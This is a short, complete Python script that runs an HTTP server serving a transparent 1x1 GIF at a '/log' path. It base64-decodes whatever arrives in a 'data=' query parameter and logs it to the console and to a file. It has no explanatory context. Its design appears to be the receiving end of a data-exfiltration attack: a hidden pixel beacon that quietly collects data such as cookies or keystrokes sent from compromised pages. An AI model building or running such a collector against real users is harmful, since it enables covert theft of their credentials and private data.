import http.server
import socketserver
import base64
from datetime import datetime

PORT = 5000

class Listener(http.server.SimpleHTTPRequestHandler):
    def do_GET(self):
        if "/log" in self.path:
            self.send_response(200)
            self.send_header("Content-type", "image/gif")
            self.end_headers()

            try:
                query = self.path.split("data=")[1]
                decoded_data = base64.b64decode(query).decode('utf-8')
                print(f"\n{datetime.now()} Information: ")
                print(f"{decoded_data}")

                with open("output_data.txt", "a") as f:
                    f.write(f"{datetime.now()} - {decoded_data}\n")
            except Exception as e:
                print(f"Error decoding data: {e}")

            transparent_gif = b'\x47\x49\x46\x38\x39\x61\x01\x00\x01\x00\x80\x00\x00\xff\xff\xff\x00\x00\x00\x21\xf9\x04\x01\x00\x00\x00\x00\x2c\x00\x00\x00\x00\x01\x00\x01\x00\x00\x02\x02\x44\x01\x00\x3b'
            self.wfile.write(transparent_gif)
        else:
            super().do_GET()

print(f"[LOG] Server is running on {PORT}...")
with socketserver.TCPServer(("", PORT), Listener) as httpd:
    httpd.serve_forever()